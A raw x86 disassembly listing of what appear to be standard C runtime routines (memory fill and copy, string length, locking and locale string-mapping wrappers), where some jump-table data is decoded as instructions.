00002715  8B442408          mov eax,[esp+0x8]
00002719  C6470200          mov byte [edi+0x2],0x0
0000271D  5F                pop edi
0000271E  C3                ret
0000271F  668917            mov [edi],dx
00002722  8B442408          mov eax,[esp+0x8]
00002726  5F                pop edi
00002727  C3                ret
00002728  8817              mov [edi],dl
0000272A  8B442408          mov eax,[esp+0x8]
0000272E  5F                pop edi
0000272F  C3                ret
00002730  8B54240C          mov edx,[esp+0xc]
00002734  8B4C2404          mov ecx,[esp+0x4]
00002738  85D2              test edx,edx
0000273A  7447              jz 0x2783
0000273C  33C0              xor eax,eax
0000273E  8A442408          mov al,[esp+0x8]
00002742  57                push edi
00002743  8BF9              mov edi,ecx
00002745  83FA04            cmp edx,byte +0x4
00002748  722D              jc 0x2777
0000274A  F7D9              neg ecx
0000274C  83E103            and ecx,byte +0x3
0000274F  7408              jz 0x2759
00002751  2BD1              sub edx,ecx
00002753  8807              mov [edi],al
00002755  47                inc edi
00002756  49                dec ecx
00002757  75FA              jnz 0x2753
00002759  8BC8              mov ecx,eax
0000275B  C1E008            shl eax,0x8
0000275E  03C1              add eax,ecx
00002760  8BC8              mov ecx,eax
00002762  C1E010            shl eax,0x10
00002765  03C1              add eax,ecx
00002767  8BCA              mov ecx,edx
00002769  83E203            and edx,byte +0x3
0000276C  C1E902            shr ecx,0x2
0000276F  7406              jz 0x2777
00002771  F3AB              rep stosd
00002773  85D2              test edx,edx
00002775  7406              jz 0x277d
00002777  8807              mov [edi],al
00002779  47                inc edi
0000277A  4A                dec edx
0000277B  75FA              jnz 0x2777
0000277D  8B442408          mov eax,[esp+0x8]
00002781  5F                pop edi
00002782  C3                ret
00002783  8B442404          mov eax,[esp+0x4]
00002787  C3                ret
00002788  CC                int3
00002789  CC                int3
0000278A  CC                int3
0000278B  CC                int3
0000278C  CC                int3
0000278D  CC                int3
0000278E  CC                int3
0000278F  CC                int3
00002790  55                push ebp
00002791  8BEC              mov ebp,esp
00002793  57                push edi
00002794  56                push esi
00002795  8B750C            mov esi,[ebp+0xc]
00002798  8B4D10            mov ecx,[ebp+0x10]
0000279B  8B7D08            mov edi,[ebp+0x8]
0000279E  8BC1              mov eax,ecx
000027A0  8BD1              mov edx,ecx
000027A2  03C6              add eax,esi
000027A4  3BFE              cmp edi,esi
000027A6  7608              jna 0x27b0
000027A8  3BF8              cmp edi,eax
000027AA  0F8278010000      jc near 0x2928
000027B0  F7C703000000      test edi,0x3
000027B6  7514              jnz 0x27cc
000027B8  C1E902            shr ecx,0x2
000027BB  83E203            and edx,byte +0x3
000027BE  83F908            cmp ecx,byte +0x8
000027C1  7229              jc 0x27ec
000027C3  F3A5              rep movsd
000027C5  FF2495D8281E00    jmp near [edx*4+0x1e28d8]
000027CC  8BC7              mov eax,edi
000027CE  BA03000000        mov edx,0x3
000027D3  83E904            sub ecx,byte +0x4
000027D6  720C              jc 0x27e4
000027D8  83E003            and eax,byte +0x3
000027DB  03C8              add ecx,eax
000027DD  FF2485F0271E00    jmp near [eax*4+0x1e27f0]
000027E4  FF248DE8281E00    jmp near [ecx*4+0x1e28e8]
000027EB  90                nop
000027EC  FF248D6C281E00    jmp near [ecx*4+0x1e286c]
000027F3  90                nop
000027F4  0028              add [eax],ch
000027F6  1E                push ds
000027F7  002C28            add [eax+ebp],ch
000027FA  1E                push ds
000027FB  005028            add [eax+0x28],dl
000027FE  1E                push ds
000027FF  0023              add [ebx],ah
00002801  D18A0688078A      ror dword [edx+0x8a078806],1
00002807  46                inc esi
00002808  018847018A46      add [eax+0x468a0147],ecx
0000280E  02C1              add al,cl
00002810  E902884702        jmp 0x247b017
00002815  83C603            add esi,byte +0x3
00002818  83C703            add edi,byte +0x3
0000281B  83F908            cmp ecx,byte +0x8
0000281E  72CC              jc 0x27ec
00002820  F3A5              rep movsd
00002822  FF2495D8281E00    jmp near [edx*4+0x1e28d8]
00002829  8D4900            lea ecx,[ecx+0x0]
0000282C  23D1              and edx,ecx
0000282E  8A06              mov al,[esi]
00002830  8807              mov [edi],al
00002832  8A4601            mov al,[esi+0x1]
00002835  C1E902            shr ecx,0x2
00002838  884701            mov [edi+0x1],al
0000283B  83C602            add esi,byte +0x2
0000283E  83C702            add edi,byte +0x2
00002841  83F908            cmp ecx,byte +0x8
00002844  72A6              jc 0x27ec
00002846  F3A5              rep movsd
00002848  FF2495D8281E00    jmp near [edx*4+0x1e28d8]
0000284F  90                nop
00002850  23D1              and edx,ecx
00002852  8A06              mov al,[esi]
00002854  8807              mov [edi],al
00002856  46                inc esi
00002857  C1E902            shr ecx,0x2
0000285A  47                inc edi
0000285B  83F908            cmp ecx,byte +0x8
0000285E  728C              jc 0x27ec
00002860  F3A5              rep movsd
00002862  FF2495D8281E00    jmp near [edx*4+0x1e28d8]
00002869  8D4900            lea ecx,[ecx+0x0]
0000286C  CF                iret
0000286D  281E              sub [esi],bl
0000286F  00BC281E00B428    add [eax+ebp+0x28b4001e],bh
00002876  1E                push ds
00002877  00AC281E00A428    add [eax+ebp+0x28a4001e],ch
0000287E  1E                push ds
0000287F  009C281E009428    add [eax+ebp+0x2894001e],bl
00002886  1E                push ds
00002887  008C281E008B44    add [eax+ebp+0x448b001e],cl
0000288E  8EE4              mov fs,sp
00002890  89448FE4          mov [edi+ecx*4-0x1c],eax
00002894  8B448EE8          mov eax,[esi+ecx*4-0x18]
00002898  89448FE8          mov [edi+ecx*4-0x18],eax
0000289C  8B448EEC          mov eax,[esi+ecx*4-0x14]
000028A0  89448FEC          mov [edi+ecx*4-0x14],eax
000028A4  8B448EF0          mov eax,[esi+ecx*4-0x10]
000028A8  89448FF0          mov [edi+ecx*4-0x10],eax
000028AC  8B448EF4          mov eax,[esi+ecx*4-0xc]
000028B0  89448FF4          mov [edi+ecx*4-0xc],eax
000028B4  8B448EF8          mov eax,[esi+ecx*4-0x8]
000028B8  89448FF8          mov [edi+ecx*4-0x8],eax
000028BC  8B448EFC          mov eax,[esi+ecx*4-0x4]
000028C0  89448FFC          mov [edi+ecx*4-0x4],eax
000028C4  8D048D00000000    lea eax,[ecx*4+0x0]
000028CB  03F0              add esi,eax
000028CD  03F8              add edi,eax
000028CF  FF2495D8281E00    jmp near [edx*4+0x1e28d8]
000028D6  8BFF              mov edi,edi
000028D8  E8281E00F0        call 0xf0004705
000028DD  281E              sub [esi],bl
000028DF  00FC              add ah,bh
000028E1  281E              sub [esi],bl
000028E3  0010              add [eax],dl
000028E5  291E              sub [esi],ebx
000028E7  008B45085E5F      add [ebx+0x5f5e0845],cl
000028ED  C9                leave
000028EE  C3                ret
000028EF  90                nop
000028F0  8A06              mov al,[esi]
000028F2  8807              mov [edi],al
000028F4  8B4508            mov eax,[ebp+0x8]
000028F7  5E                pop esi
000028F8  5F                pop edi
000028F9  C9                leave
000028FA  C3                ret
000028FB  90                nop
000028FC  8A06              mov al,[esi]
000028FE  8807              mov [edi],al
00002900  8A4601            mov al,[esi+0x1]
00002903  884701            mov [edi+0x1],al
00002906  8B4508            mov eax,[ebp+0x8]
00002909  5E                pop esi
0000290A  5F                pop edi
0000290B  C9                leave
0000290C  C3                ret
0000290D  8D4900            lea ecx,[ecx+0x0]
00002910  8A06              mov al,[esi]
00002912  8807              mov [edi],al
00002914  8A4601            mov al,[esi+0x1]
00002917  884701            mov [edi+0x1],al
0000291A  8A4602            mov al,[esi+0x2]
0000291D  884702            mov [edi+0x2],al
00002920  8B4508            mov eax,[ebp+0x8]
00002923  5E                pop esi
00002924  5F                pop edi
00002925  C9                leave
00002926  C3                ret
00002927  90                nop
00002928  8D7431FC          lea esi,[ecx+esi-0x4]
0000292C  8D7C39FC          lea edi,[ecx+edi-0x4]
00002930  F7C703000000      test edi,0x3
00002936  7524              jnz 0x295c
00002938  C1E902            shr ecx,0x2
0000293B  83E203            and edx,byte +0x3
0000293E  83F908            cmp ecx,byte +0x8
00002941  720D              jc 0x2950
00002943  FD                std
00002944  F3A5              rep movsd
00002946  FC                cld
00002947  FF2495702A1E00    jmp near [edx*4+0x1e2a70]
0000294E  8BFF              mov edi,edi
00002950  F7D9              neg ecx
00002952  FF248D202A1E00    jmp near [ecx*4+0x1e2a20]
00002959  8D4900            lea ecx,[ecx+0x0]
0000295C  8BC7              mov eax,edi
0000295E  BA03000000        mov edx,0x3
00002963  83F904            cmp ecx,byte +0x4
00002966  720C              jc 0x2974
00002968  83E003            and eax,byte +0x3
0000296B  2BC8              sub ecx,eax
0000296D  FF248578291E00    jmp near [eax*4+0x1e2978]
00002974  FF248D702A1E00    jmp near [ecx*4+0x1e2a70]
0000297B  90                nop
0000297C  8829              mov [ecx],ch
0000297E  1E                push ds
0000297F  00A8291E00D0      add [eax+0xd0001e29],ch
00002985  291E              sub [esi],ebx
00002987  008A460323D1      add [edx+0xd1230346],cl
0000298D  884703            mov [edi+0x3],al
00002990  4E                dec esi
00002991  C1E902            shr ecx,0x2
00002994  4F                dec edi
00002995  83F908            cmp ecx,byte +0x8
00002998  72B6              jc 0x2950
0000299A  FD                std
0000299B  F3A5              rep movsd
0000299D  FC                cld
0000299E  FF2495702A1E00    jmp near [edx*4+0x1e2a70]
000029A5  8D4900            lea ecx,[ecx+0x0]
000029A8  8A4603            mov al,[esi+0x3]
000029AB  23D1              and edx,ecx
000029AD  884703            mov [edi+0x3],al
000029B0  8A4602            mov al,[esi+0x2]
000029B3  C1E902            shr ecx,0x2
000029B6  884702            mov [edi+0x2],al
000029B9  83EE02            sub esi,byte +0x2
000029BC  83EF02            sub edi,byte +0x2
000029BF  83F908            cmp ecx,byte +0x8
000029C2  728C              jc 0x2950
000029C4  FD                std
000029C5  F3A5              rep movsd
000029C7  FC                cld
000029C8  FF2495702A1E00    jmp near [edx*4+0x1e2a70]
000029CF  90                nop
000029D0  8A4603            mov al,[esi+0x3]
000029D3  23D1              and edx,ecx
000029D5  884703            mov [edi+0x3],al
000029D8  8A4602            mov al,[esi+0x2]
000029DB  884702            mov [edi+0x2],al
000029DE  8A4601            mov al,[esi+0x1]
000029E1  C1E902            shr ecx,0x2
000029E4  884701            mov [edi+0x1],al
000029E7  83EE03            sub esi,byte +0x3
000029EA  83EF03            sub edi,byte +0x3
000029ED  83F908            cmp ecx,byte +0x8
000029F0  0F825AFFFFFF      jc near 0x2950
000029F6  FD                std
000029F7  F3A5              rep movsd
000029F9  FC                cld
000029FA  FF2495702A1E00    jmp near [edx*4+0x1e2a70]
00002A01  8D4900            lea ecx,[ecx+0x0]
00002A04  242A              and al,0x2a
00002A06  1E                push ds
00002A07  002C2A            add [edx+ebp],ch
00002A0A  1E                push ds
00002A0B  00342A            add [edx+ebp],dh
00002A0E  1E                push ds
00002A0F  003C2A            add [edx+ebp],bh
00002A12  1E                push ds
00002A13  00442A1E          add [edx+ebp+0x1e],al
00002A17  004C2A1E          add [edx+ebp+0x1e],cl
00002A1B  00542A1E          add [edx+ebp+0x1e],dl
00002A1F  00672A            add [edi+0x2a],ah
00002A22  1E                push ds
00002A23  008B448E1C89      add [ebx+0x891c8e44],cl
00002A29  44                inc esp
00002A2A  8F                db 0x8F
00002A2B  1C8B              sbb al,0x8b
00002A2D  44                inc esp
00002A2E  8E18              mov ds,[eax]
00002A30  89448F18          mov [edi+ecx*4+0x18],eax
00002A34  8B448E14          mov eax,[esi+ecx*4+0x14]
00002A38  89448F14          mov [edi+ecx*4+0x14],eax
00002A3C  8B448E10          mov eax,[esi+ecx*4+0x10]
00002A40  89448F10          mov [edi+ecx*4+0x10],eax
00002A44  8B448E0C          mov eax,[esi+ecx*4+0xc]
00002A48  89448F0C          mov [edi+ecx*4+0xc],eax
00002A4C  8B448E08          mov eax,[esi+ecx*4+0x8]
00002A50  89448F08          mov [edi+ecx*4+0x8],eax
00002A54  8B448E04          mov eax,[esi+ecx*4+0x4]
00002A58  89448F04          mov [edi+ecx*4+0x4],eax
00002A5C  8D048D00000000    lea eax,[ecx*4+0x0]
00002A63  03F0              add esi,eax
00002A65  03F8              add edi,eax
00002A67  FF2495702A1E00    jmp near [edx*4+0x1e2a70]
00002A6E  8BFF              mov edi,edi
00002A70  802A1E            sub byte [edx],0x1e
00002A73  00882A1E0098      add [eax+0x98001e2a],cl
00002A79  2A1E              sub bl,[esi]
00002A7B  00AC2A1E008B45    add [edx+ebp+0x458b001e],ch
00002A82  085E5F            or [esi+0x5f],bl
00002A85  C9                leave
00002A86  C3                ret
00002A87  90                nop
00002A88  8A4603            mov al,[esi+0x3]
00002A8B  884703            mov [edi+0x3],al
00002A8E  8B4508            mov eax,[ebp+0x8]
00002A91  5E                pop esi
00002A92  5F                pop edi
00002A93  C9                leave
00002A94  C3                ret
00002A95  8D4900            lea ecx,[ecx+0x0]
00002A98  8A4603            mov al,[esi+0x3]
00002A9B  884703            mov [edi+0x3],al
00002A9E  8A4602            mov al,[esi+0x2]
00002AA1  884702            mov [edi+0x2],al
00002AA4  8B4508            mov eax,[ebp+0x8]
00002AA7  5E                pop esi
00002AA8  5F                pop edi
00002AA9  C9                leave
00002AAA  C3                ret
00002AAB  90                nop
00002AAC  8A4603            mov al,[esi+0x3]
00002AAF  884703            mov [edi+0x3],al
00002AB2  8A4602            mov al,[esi+0x2]
00002AB5  884702            mov [edi+0x2],al
00002AB8  8A4601            mov al,[esi+0x1]
00002ABB  884701            mov [edi+0x1],al
00002ABE  8B4508            mov eax,[ebp+0x8]
00002AC1  5E                pop esi
00002AC2  5F                pop edi
00002AC3  C9                leave
00002AC4  C3                ret
00002AC5  CC                int3
00002AC6  CC                int3
00002AC7  CC                int3
00002AC8  CC                int3
00002AC9  CC                int3
00002ACA  CC                int3
00002ACB  CC                int3
00002ACC  CC                int3
00002ACD  CC                int3
00002ACE  CC                int3
00002ACF  CC                int3
00002AD0  8B4C2404          mov ecx,[esp+0x4]
00002AD4  F7C103000000      test ecx,0x3
00002ADA  7414              jz 0x2af0
00002ADC  8A01              mov al,[ecx]
00002ADE  41                inc ecx
00002ADF  84C0              test al,al
00002AE1  7440              jz 0x2b23
00002AE3  F7C103000000      test ecx,0x3
00002AE9  75F1              jnz 0x2adc
00002AEB  0500000000        add eax,0x0
00002AF0  8B01              mov eax,[ecx]
00002AF2  BAFFFEFE7E        mov edx,0x7efefeff
00002AF7  03D0              add edx,eax
00002AF9  83F0FF            xor eax,byte -0x1
00002AFC  33C2              xor eax,edx
00002AFE  83C104            add ecx,byte +0x4
00002B01  A900010181        test eax,0x81010100
00002B06  74E8              jz 0x2af0
00002B08  8B41FC            mov eax,[ecx-0x4]
00002B0B  84C0              test al,al
00002B0D  7432              jz 0x2b41
00002B0F  84E4              test ah,ah
00002B11  7424              jz 0x2b37
00002B13  A90000FF00        test eax,0xff0000
00002B18  7413              jz 0x2b2d
00002B1A  A9000000FF        test eax,0xff000000
00002B1F  7402              jz 0x2b23
00002B21  EBCD              jmp short 0x2af0
00002B23  8D41FF            lea eax,[ecx-0x1]
00002B26  8B4C2404          mov ecx,[esp+0x4]
00002B2A  2BC1              sub eax,ecx
00002B2C  C3                ret
00002B2D  8D41FE            lea eax,[ecx-0x2]
00002B30  8B4C2404          mov ecx,[esp+0x4]
00002B34  2BC1              sub eax,ecx
00002B36  C3                ret
00002B37  8D41FD            lea eax,[ecx-0x3]
00002B3A  8B4C2404          mov ecx,[esp+0x4]
00002B3E  2BC1              sub eax,ecx
00002B40  C3                ret
00002B41  8D41FC            lea eax,[ecx-0x4]
00002B44  8B4C2404          mov ecx,[esp+0x4]
00002B48  2BC1              sub eax,ecx
00002B4A  C3                ret
00002B4B  6A02              push byte +0x2
00002B4D  E8150D0000        call 0x3867
00002B52  59                pop ecx
00002B53  C3                ret
00002B54  55                push ebp
00002B55  8BEC              mov ebp,esp
00002B57  6AFF              push byte -0x1
00002B59  6880571E00        push dword 0x1e5780
00002B5E  682C3E1E00        push dword 0x1e3e2c
00002B63  64A100000000      mov eax,[fs:0x0]
00002B69  50                push eax
00002B6A  64892500000000    mov [fs:0x0],esp
00002B71  83EC18            sub esp,byte +0x18
00002B74  53                push ebx
00002B75  56                push esi
00002B76  57                push edi
00002B77  8965E8            mov [ebp-0x18],esp
00002B7A  A12C6D1E00        mov eax,[0x1e6d2c]
00002B7F  33DB              xor ebx,ebx
00002B81  3BC3              cmp eax,ebx
00002B83  753E              jnz 0x2bc3
00002B85  8D45E4            lea eax,[ebp-0x1c]
00002B88  50                push eax
00002B89  6A01              push byte +0x1
00002B8B  5E                pop esi
00002B8C  56                push esi
00002B8D  687C571E00        push dword 0x1e577c
00002B92  56                push esi
00002B93  FF15A8561E00      call near [0x1e56a8]
00002B99  85C0              test eax,eax
00002B9B  7404              jz 0x2ba1
00002B9D  8BC6              mov eax,esi
00002B9F  EB1D              jmp short 0x2bbe
00002BA1  8D45E4            lea eax,[ebp-0x1c]
00002BA4  50                push eax
00002BA5  56                push esi
00002BA6  6878571E00        push dword 0x1e5778
00002BAB  56                push esi
00002BAC  53                push ebx
00002BAD  FF15A4561E00      call near [0x1e56a4]
00002BB3  85C0              test eax,eax
00002BB5  0F84CE000000      jz near 0x2c89
00002BBB  6A02              push byte +0x2
00002BBD  58                pop eax
00002BBE  A32C6D1E00        mov [0x1e6d2c],eax
00002BC3  83F802            cmp eax,byte +0x2
00002BC6  7524              jnz 0x2bec
00002BC8  8B451C            mov eax,[ebp+0x1c]
00002BCB  3BC3              cmp eax,ebx
00002BCD  7505              jnz 0x2bd4
00002BCF  A1A46D1E00        mov eax,[0x1e6da4]
00002BD4  FF7514            push dword [ebp+0x14]
00002BD7  FF7510            push dword [ebp+0x10]
00002BDA  FF750C            push dword [ebp+0xc]
00002BDD  FF7508            push dword [ebp+0x8]
00002BE0  50                push eax
00002BE1  FF15A4561E00      call near [0x1e56a4]
00002BE7  E99F000000        jmp 0x2c8b
00002BEC  83F801            cmp eax,byte +0x1
00002BEF  0F8594000000      jnz near 0x2c89
00002BF5  395D18            cmp [ebp+0x18],ebx
00002BF8  7508              jnz 0x2c02
00002BFA  A1B46D1E00        mov eax,[0x1e6db4]
00002BFF  894518            mov [ebp+0x18],eax
00002C02  53                push ebx
00002C03  53                push ebx
00002C04  FF7510            push dword [ebp+0x10]
00002C07  FF750C            push dword [ebp+0xc]
00002C0A  8B4520            mov eax,[ebp+0x20]
00002C0D  F7D8              neg eax
00002C0F  1BC0              sbb eax,eax
00002C11  83E008            and eax,byte +0x8
00002C14  40                inc eax
00002C15  50                push eax
00002C16  FF7518            push dword [ebp+0x18]
00002C19  FF15A0561E00      call near [0x1e56a0]
00002C1F  8945E0            mov [ebp-0x20],eax
00002C22  3BC3              cmp eax,ebx
00002C24  7463              jz 0x2c89
00002C26  895DFC            mov [ebp-0x4],ebx
00002C29  8D3C00            lea edi,[eax+eax]
00002C2C  8BC7              mov eax,edi
00002C2E  83C003            add eax,byte +0x3
00002C31  24FC              and al,0xfc
00002C33  E8D8120000        call 0x3f10
00002C38  8965E8            mov [ebp-0x18],esp
00002C3B  8BF4              mov esi,esp
00002C3D  8975DC            mov [ebp-0x24],esi
00002C40  57                push edi
00002C41  53                push ebx
00002C42  56                push esi
00002C43  E8E8FAFFFF        call 0x2730
00002C48  83C40C            add esp,byte +0xc
00002C4B  EB0B              jmp short 0x2c58
00002C4D  6A01              push byte +0x1
00002C4F  58                pop eax
00002C50  C3                ret
00002C51  8B65E8            mov esp,[ebp-0x18]
00002C54  33DB              xor ebx,ebx
00002C56  33F6              xor esi,esi
00002C58  834DFCFF          or dword [ebp-0x4],byte -0x1
00002C5C  3BF3              cmp esi,ebx
00002C5E  7429              jz 0x2c89
00002C60  FF75E0            push dword [ebp-0x20]
00002C63  56                push esi
00002C64  FF7510            push dword [ebp+0x10]
00002C67  FF750C            push dword [ebp+0xc]
00002C6A  6A01              push byte +0x1
00002C6C  FF7518            push dword [ebp+0x18]
00002C6F  FF15A0561E00      call near [0x1e56a0]
00002C75  3BC3              cmp eax,ebx
00002C77  7410              jz 0x2c89
00002C79  FF7514            push dword [ebp+0x14]
00002C7C  50                push eax
00002C7D  56                push esi
00002C7E  FF7508            push dword [ebp+0x8]
00002C81  FF15A8561E00      call near [0x1e56a8]
00002C87  EB02              jmp short 0x2c8b
00002C89  33C0              xor eax,eax
00002C8B  8D65CC            lea esp,[ebp-0x34]
00002C8E  8B4DF0            mov ecx,[ebp-0x10]
00002C91  64890D00000000    mov [fs:0x0],ecx
00002C98  5F                pop edi
00002C99  5E                pop esi
00002C9A  5B                pop ebx
00002C9B  C9                leave
00002C9C  C3                ret
00002C9D  55                push ebp
00002C9E  8BEC              mov ebp,esp
00002CA0  8B4508            mov eax,[ebp+0x8]
00002CA3  56                push esi
00002CA4  833C8590621E0000  cmp dword [eax*4+0x1e6290],byte +0x0
00002CAC  8D348590621E00    lea esi,[eax*4+0x1e6290]
00002CB3  753E              jnz 0x2cf3
00002CB5  57                push edi
00002CB6  6A18              push byte +0x18
00002CB8  E8080F0000        call 0x3bc5
00002CBD  8BF8              mov edi,eax
00002CBF  59                pop ecx
00002CC0  85FF              test edi,edi
00002CC2  7508              jnz 0x2ccc
00002CC4  6A11              push byte +0x11
00002CC6  E89C0B0000        call 0x3867
00002CCB  59                pop ecx
00002CCC  6A11              push byte +0x11
00002CCE  E8CAFFFFFF        call 0x2c9d
00002CD3  833E00            cmp dword [esi],byte +0x0
00002CD6  59                pop ecx
00002CD7  57                push edi
00002CD8  750A              jnz 0x2ce4
00002CDA  FF15AC561E00      call near [0x1e56ac]
00002CE0  893E              mov [esi],edi
00002CE2  EB06              jmp short 0x2cea
00002CE4  E856120000        call 0x3f3f
00002CE9  59                pop ecx
00002CEA  6A11              push byte +0x11
00002CEC  E80D000000        call 0x2cfe
00002CF1  59                pop ecx
00002CF2  5F                pop edi
00002CF3  FF36              push dword [esi]
00002CF5  FF15B0561E00      call near [0x1e56b0]
00002CFB  5E                pop esi
00002CFC  5D                pop ebp
00002CFD  C3                ret
00002CFE  55                push ebp
00002CFF  8BEC              mov ebp,esp
00002D01  8B4508            mov eax,[ebp+0x8]
00002D04  FF348590621E00    push dword [eax*4+0x1e6290]
00002D0B  FF15B4561E00      call near [0x1e56b4]
00002D11  5D                pop ebp
00002D12  C3                ret
00002D13  55                push ebp
00002D14  8BEC              mov ebp,esp
00002D16  6AFF              push byte -0x1
00002D18  6890571E00        push dword 0x1e5790
00002D1D  682C3E1E00        push dword 0x1e3e2c
00002D22  64A100000000      mov eax,[fs:0x0]
00002D28  50                push eax
00002D29  64892500000000    mov [fs:0x0],esp
00002D30  83EC1C            sub esp,byte +0x1c
00002D33  53                push ebx
00002D34  56                push esi
00002D35  57                push edi
00002D36  8965E8            mov [ebp-0x18],esp
00002D39  33FF              xor edi,edi
00002D3B  393DBC6D1E00      cmp [0x1e6dbc],edi
00002D41  7546              jnz 0x2d89
00002D43  57                push edi
00002D44  57                push edi
00002D45  6A01              push byte +0x1
00002D47  5B                pop ebx
00002D48  53                push ebx
00002D49  687C571E00        push dword 0x1e577c
00002D4E  BE00010000        mov esi,0x100
00002D53  56                push esi
00002D54  57                push edi
00002D55  FF15C4561E00      call near [0x1e56c4]
00002D5B  85C0              test eax,eax
00002D5D  7408              jz 0x2d67
00002D5F  891DBC6D1E00      mov [0x1e6dbc],ebx
00002D65  EB22              jmp short 0x2d89
00002D67  57                push edi
00002D68  57                push edi
00002D69  53                push ebx
00002D6A  6878571E00        push dword 0x1e5778
00002D6F  56                push esi
00002D70  57                push edi
00002D71  FF15C0561E00      call near [0x1e56c0]
00002D77  85C0              test eax,eax
00002D79  0F8422010000      jz near 0x2ea1
00002D7F  C705BC6D1E000200  mov dword [0x1e6dbc],0x2
         -0000
00002D89  397D14            cmp [ebp+0x14],edi
00002D8C  7E10              jng 0x2d9e
00002D8E  FF7514            push dword [ebp+0x14]
00002D91  FF7510            push dword [ebp+0x10]
00002D94  E89E010000        call 0x2f37
00002D99  59                pop ecx
00002D9A  59                pop ecx
00002D9B  894514            mov [ebp+0x14],eax
00002D9E  A1BC6D1E00        mov eax,[0x1e6dbc]
00002DA3  83F802            cmp eax,byte +0x2
00002DA6  751D              jnz 0x2dc5
00002DA8  FF751C            push dword [ebp+0x1c]
00002DAB  FF7518            push dword [ebp+0x18]
00002DAE  FF7514            push dword [ebp+0x14]
00002DB1  FF7510            push dword [ebp+0x10]
00002DB4  FF750C            push dword [ebp+0xc]
00002DB7  FF7508            push dword [ebp+0x8]
00002DBA  FF15C0561E00      call near [0x1e56c0]
00002DC0  E9DE000000        jmp 0x2ea3
00002DC5  83F801            cmp eax,byte +0x1
00002DC8  0F85D3000000      jnz near 0x2ea1
00002DCE  397D20            cmp [ebp+0x20],edi
00002DD1  7508              jnz 0x2ddb
00002DD3  A1B46D1E00        mov eax,[0x1e6db4]
00002DD8  894520            mov [ebp+0x20],eax
00002DDB  57                push edi
00002DDC  57                push edi
00002DDD  FF7514            push dword [ebp+0x14]
00002DE0  FF7510            push dword [ebp+0x10]
00002DE3  8B4524            mov eax,[ebp+0x24]
00002DE6  F7D8              neg eax
00002DE8  1BC0              sbb eax,eax
00002DEA  83E008            and eax,byte +0x8
00002DED  40                inc eax
00002DEE  50                push eax
00002DEF  FF7520            push dword [ebp+0x20]
00002DF2  FF15A0561E00      call near [0x1e56a0]
00002DF8  8BD8              mov ebx,eax
00002DFA  895DE4            mov [ebp-0x1c],ebx
00002DFD  3BDF              cmp ebx,edi
00002DFF  0F849C000000      jz near 0x2ea1
00002E05  897DFC            mov [ebp-0x4],edi
00002E08  8D041B            lea eax,[ebx+ebx]
00002E0B  83C003            add eax,byte +0x3
00002E0E  24FC              and al,0xfc
00002E10  E8FB100000        call 0x3f10
00002E15  8965E8            mov [ebp-0x18],esp
00002E18  8BC4              mov eax,esp
00002E1A  8945DC            mov [ebp-0x24],eax
00002E1D  834DFCFF          or dword [ebp-0x4],byte -0x1
00002E21  EB13              jmp short 0x2e36
00002E23  6A01              push byte +0x1
00002E25  58                pop eax
00002E26  C3                ret
00002E27  8B65E8            mov esp,[ebp-0x18]
00002E2A  33FF              xor edi,edi
00002E2C  897DDC            mov [ebp-0x24],edi
00002E2F  834DFCFF          or dword [ebp-0x4],byte -0x1
00002E33  8B5DE4            mov ebx,[ebp-0x1c]
00002E36  397DDC            cmp [ebp-0x24],edi
00002E39  7466              jz 0x2ea1
00002E3B  53                push ebx
00002E3C  FF75DC            push dword [ebp-0x24]
00002E3F  FF7514            push dword [ebp+0x14]
00002E42  FF7510            push dword [ebp+0x10]
00002E45  6A01              push byte +0x1
00002E47  FF7520            push dword [ebp+0x20]
00002E4A  FF15A0561E00      call near [0x1e56a0]
00002E50  85C0              test eax,eax
00002E52  744D              jz 0x2ea1
00002E54  57                push edi
00002E55  57                push edi
00002E56  53                push ebx
00002E57  FF75DC            push dword [ebp-0x24]
00002E5A  FF750C            push dword [ebp+0xc]
00002E5D  FF7508            push dword [ebp+0x8]
00002E60  FF15C4561E00      call near [0x1e56c4]
00002E66  8BF0              mov esi,eax
00002E68  8975D8            mov [ebp-0x28],esi
00002E6B  3BF7              cmp esi,edi
00002E6D  7432              jz 0x2ea1
00002E6F  F6450D04          test byte [ebp+0xd],0x4
00002E73  7440              jz 0x2eb5
00002E75  397D1C            cmp [ebp+0x1c],edi
00002E78  0F84B2000000      jz near 0x2f30
00002E7E  3B751C            cmp esi,[ebp+0x1c]
00002E81  7F1E              jg 0x2ea1
00002E83  FF751C            push dword [ebp+0x1c]
00002E86  FF7518            push dword [ebp+0x18]
00002E89  53                push ebx
00002E8A  FF75DC            push dword [ebp-0x24]
00002E8D  FF750C            push dword [ebp+0xc]
00002E90  FF7508            push dword [ebp+0x8]
00002E93  FF15C4561E00      call near [0x1e56c4]
00002E99  85C0              test eax,eax
00002E9B  0F858F000000      jnz near 0x2f30
00002EA1  33C0              xor eax,eax
00002EA3  8D65C8            lea esp,[ebp-0x38]
00002EA6  8B4DF0            mov ecx,[ebp-0x10]
00002EA9  64890D00000000    mov [fs:0x0],ecx
00002EB0  5F                pop edi
00002EB1  5E                pop esi
00002EB2  5B                pop ebx
00002EB3  C9                leave
00002EB4  C3                ret
00002EB5  C745FC01000000    mov dword [ebp-0x4],0x1
00002EBC  8D0436            lea eax,[esi+esi]
00002EBF  83C003            add eax,byte +0x3
00002EC2  24FC              and al,0xfc
00002EC4  E847100000        call 0x3f10
00002EC9  8965E8            mov [ebp-0x18],esp
00002ECC  8BDC              mov ebx,esp
00002ECE  895DE0            mov [ebp-0x20],ebx
00002ED1  834DFCFF          or dword [ebp-0x4],byte -0x1
00002ED5  EB12              jmp short 0x2ee9
00002ED7  6A01              push byte +0x1
00002ED9  58                pop eax
00002EDA  C3                ret
00002EDB  8B65E8            mov esp,[ebp-0x18]
00002EDE  33FF              xor edi,edi
00002EE0  33DB              xor ebx,ebx
00002EE2  834DFCFF          or dword [ebp-0x4],byte -0x1
00002EE6  8B75D8            mov esi,[ebp-0x28]
00002EE9  3BDF              cmp ebx,edi
00002EEB  74B4              jz 0x2ea1
00002EED  56                push esi
00002EEE  53                push ebx
00002EEF  FF75E4            push dword [ebp-0x1c]
00002EF2  FF75DC            push dword [ebp-0x24]
00002EF5  FF750C            push dword [ebp+0xc]
00002EF8  FF7508            push dword [ebp+0x8]
00002EFB  FF15C4561E00      call near [0x1e56c4]
00002F01  85C0              test eax,eax
00002F03  749C              jz 0x2ea1
00002F05  397D1C            cmp [ebp+0x1c],edi
00002F08  57                push edi
00002F09  57                push edi
00002F0A  7504              jnz 0x2f10
00002F0C  57                push edi
00002F0D  57                push edi
00002F0E  EB06              jmp short 0x2f16
00002F10  FF751C            push dword [ebp+0x1c]
00002F13  FF7518            push dword [ebp+0x18]
00002F16  56                push esi
00002F17  53                push ebx
00002F18  6820020000        push dword 0x220
00002F1D  FF7520            push dword [ebp+0x20]
